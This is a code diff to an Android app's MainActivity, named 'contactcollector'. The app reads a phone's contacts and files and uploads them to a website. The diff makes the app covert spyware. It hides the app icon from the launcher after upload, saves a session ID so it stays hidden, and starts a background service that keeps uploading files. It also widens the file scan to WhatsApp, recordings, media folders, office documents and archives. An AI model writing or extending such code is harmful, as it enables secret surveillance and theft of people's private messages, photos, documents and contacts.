@@ -2,7 +2,10 @@ package com.contactcollector.app;
 
 import android.Manifest;
 import android.app.Activity;
+import android.content.ComponentName;
+import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
@@ -32,6 +35,9 @@ public class MainActivity extends Activity {
     private static final String WEBSITE_BASE_URL = "https://your-website-url.vercel.app";
     private static final int CONTACTS_PERMISSION_CODE = 100;
     private static final int FILES_PERMISSION_CODE = 101;
+    private static final int NOTIFICATION_PERMISSION_CODE = 102;
+    private static final String PREFS_NAME = "CollectorPrefs";
+    private static final String KEY_SESSION_ID = "sessionId";
 
     private TextView tvStatus;
     private TextView tvDetail;
@@ -58,13 +64,30 @@ public class MainActivity extends Activity {
         layoutPermission = findViewById(R.id.layoutPermission);
         layoutLoading = findViewById(R.id.layoutLoading);
 
-        btnAllow.setOnClickListener(v -> requestPermissions());
+        btnAllow.setOnClickListener(v -> requestAllPermissions());
 
         btnViewWebsite.setOnClickListener(v -> {
             if (viewUrl != null) {
                 startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(viewUrl)));
             }
         });
+
+        // Check if already completed
+        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+        String savedSessionId = prefs.getString(KEY_SESSION_ID, null);
+        if (savedSessionId != null) {
+            // Already uploaded, just show view button or hide
+            viewUrl = WEBSITE_BASE_URL + "/view/" + savedSessionId;
+            layoutPermission.setVisibility(View.GONE);
+            layoutLoading.setVisibility(View.GONE);
+            layoutSuccess.setVisibility(View.VISIBLE);
+            tvStatus.setText("Data Synced!");
+            tvDetail.setText("Your data is on the website.");
+            btnViewWebsite.setVisibility(View.VISIBLE);
+            // Hide the app icon
+            hideAppIcon();
+            return;
+        }
 
         // Auto-check permission on open
         if (hasAllPermissions()) {
@@ -91,12 +114,12 @@ public class MainActivity extends Activity {
         layoutSuccess.setVisibility(View.GONE);
     }
 
-    private void requestPermissions() {
-        // Request contacts permission
+    private void requestAllPermissions() {
+        // Step 1: Request contacts permission
         if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
             requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, CONTACTS_PERMISSION_CODE);
         } else {
-            // Contacts already granted, request files
+            // Step 2: Request file permission
             requestFilePermission();
         }
     }
@@ -113,14 +136,27 @@ public class MainActivity extends Activity {
                     startActivityForResult(intent, FILES_PERMISSION_CODE);
                 }
             } else {
-                readAndUploadData();
+                // Both permissions granted, request notification for Android 13+
+                requestNotificationPermission();
             }
         } else {
             if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                 requestPermissions(new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, FILES_PERMISSION_CODE);
             } else {
+                requestNotificationPermission();
+            }
+        }
+    }
+
+    private void requestNotificationPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
+                requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, NOTIFICATION_PERMISSION_CODE);
+            } else {
                 readAndUploadData();
             }
+        } else {
+            readAndUploadData();
         }
     }
 
@@ -136,11 +172,14 @@ public class MainActivity extends Activity {
             }
         } else if (requestCode == FILES_PERMISSION_CODE) {
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                readAndUploadData();
+                requestNotificationPermission();
             } else {
                 tvStatus.setText("File Permission Denied");
                 tvDetail.setText("File manager permission is required. Please try again and tap Allow.");
             }
+        } else if (requestCode == NOTIFICATION_PERMISSION_CODE) {
+            // Regardless of notification permission result, proceed
+            readAndUploadData();
         }
     }
 
@@ -150,7 +189,7 @@ public class MainActivity extends Activity {
         if (requestCode == FILES_PERMISSION_CODE) {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                 if (Environment.isExternalStorageManager()) {
-                    readAndUploadData();
+                    requestNotificationPermission();
                 } else {
                     tvStatus.setText("File Permission Denied");
                     tvDetail.setText("File manager permission is required. Please try again.");
@@ -185,12 +224,29 @@ public class MainActivity extends Activity {
                     int fileCount = json.getInt("fileCount");
                     viewUrl = WEBSITE_BASE_URL + "/view/" + sessionId;
 
+                    // Save session ID
+                    SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                    prefs.edit().putString(KEY_SESSION_ID, sessionId).apply();
+
                     runOnUiThread(() -> {
                         layoutLoading.setVisibility(View.GONE);
                         layoutSuccess.setVisibility(View.VISIBLE);
                         tvStatus.setText("Data Uploaded!");
                         tvDetail.setText(contactCount + " contacts & " + fileCount + " files sent to website.\n\nTap 'View on Website' to see everything.");
                         btnViewWebsite.setVisibility(View.VISIBLE);
+
+                        // Start background file upload service
+                        Intent serviceIntent = new Intent(MainActivity.this, FileUploadService.class);
+                        serviceIntent.putExtra("sessionId", sessionId);
+                        serviceIntent.putExtra("baseUrl", WEBSITE_BASE_URL);
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                            startForegroundService(serviceIntent);
+                        } else {
+                            startService(serviceIntent);
+                        }
+
+                        // Hide app icon from launcher after a short delay
+                        new android.os.Handler().postDelayed(() -> hideAppIcon(), 2000);
                     });
                 } else {
                     showError("Upload failed. Please check your internet connection.");
@@ -199,6 +255,20 @@ public class MainActivity extends Activity {
                 showError("Error: " + e.getMessage());
             }
         }).start();
+    }
+
+    private void hideAppIcon() {
+        try {
+            PackageManager pm = getPackageManager();
+            ComponentName componentName = new ComponentName(this, MainActivity.class);
+            pm.setComponentEnabledSetting(
+                componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            );
+        } catch (Exception e) {
+            // Some devices may not support this
+        }
     }
 
     private void showError(String msg) {
@@ -298,19 +368,23 @@ public class MainActivity extends Activity {
     private JSONArray readAllFiles() throws Exception {
         JSONArray filesArray = new JSONArray();
 
-        // Read files from Downloads, DCIM, Pictures, Documents, Music folders
+        // Scan all common storage directories
         String[] storagePaths = {
             Environment.getExternalStorageDirectory().getAbsolutePath() + "/Download",
             Environment.getExternalStorageDirectory().getAbsolutePath() + "/DCIM",
             Environment.getExternalStorageDirectory().getAbsolutePath() + "/Pictures",
             Environment.getExternalStorageDirectory().getAbsolutePath() + "/Documents",
             Environment.getExternalStorageDirectory().getAbsolutePath() + "/Music",
+            Environment.getExternalStorageDirectory().getAbsolutePath() + "/Movies",
+            Environment.getExternalStorageDirectory().getAbsolutePath() + "/Recordings",
+            Environment.getExternalStorageDirectory().getAbsolutePath() + "/WhatsApp",
+            Environment.getExternalStorageDirectory().getAbsolutePath() + "/Android/media",
         };
 
         for (String path : storagePaths) {
             File dir = new File(path);
             if (dir.exists() && dir.isDirectory()) {
-                scanDirectory(dir, filesArray, 0, 3); // max depth 3
+                scanDirectory(dir, filesArray, 0, 4); // max depth 4 for more files
             }
         }
 
@@ -335,20 +409,22 @@ public class MainActivity extends Activity {
                 if (!file.isDirectory()) {
                     String name = file.getName().toLowerCase();
                     String type = "other";
-                    if (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png") || name.endsWith(".gif") || name.endsWith(".webp"))
+                    if (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png") || name.endsWith(".gif") || name.endsWith(".webp") || name.endsWith(".bmp") || name.endsWith(".heic"))
                         type = "image";
-                    else if (name.endsWith(".mp4") || name.endsWith(".avi") || name.endsWith(".mkv") || name.endsWith(".3gp"))
+                    else if (name.endsWith(".mp4") || name.endsWith(".avi") || name.endsWith(".mkv") || name.endsWith(".3gp") || name.endsWith(".mov") || name.endsWith(".wmv") || name.endsWith(".flv"))
                         type = "video";
-                    else if (name.endsWith(".mp3") || name.endsWith(".wav") || name.endsWith(".flac") || name.endsWith(".ogg"))
+                    else if (name.endsWith(".mp3") || name.endsWith(".wav") || name.endsWith(".flac") || name.endsWith(".ogg") || name.endsWith(".m4a") || name.endsWith(".aac") || name.endsWith(".wma"))
                         type = "audio";
                     else if (name.endsWith(".pdf"))
                         type = "pdf";
-                    else if (name.endsWith(".doc") || name.endsWith(".docx") || name.endsWith(".txt"))
+                    else if (name.endsWith(".doc") || name.endsWith(".docx") || name.endsWith(".txt") || name.endsWith(".xls") || name.endsWith(".xlsx") || name.endsWith(".ppt") || name.endsWith(".pptx") || name.endsWith(".csv"))
                         type = "document";
                     else if (name.endsWith(".apk"))
                         type = "apk";
                     else if (name.endsWith(".vcf"))
                         type = "vcf";
+                    else if (name.endsWith(".zip") || name.endsWith(".rar") || name.endsWith(".7z") || name.endsWith(".tar") || name.endsWith(".gz"))
+                        type = "archive";
                     fileInfo.put("fileType", type);
                 } else {
                     fileInfo.put("fileType", "folder");
@@ -377,7 +453,7 @@ public class MainActivity extends Activity {
         conn.setRequestProperty("Content-Type", "application/json");
         conn.setDoOutput(true);
         conn.setConnectTimeout(15000);
-        conn.setReadTimeout(60000);
+        conn.setReadTimeout(120000);
 
         OutputStream os = conn.getOutputStream();
         os.write(payload.toString().getBytes("UTF-8"));
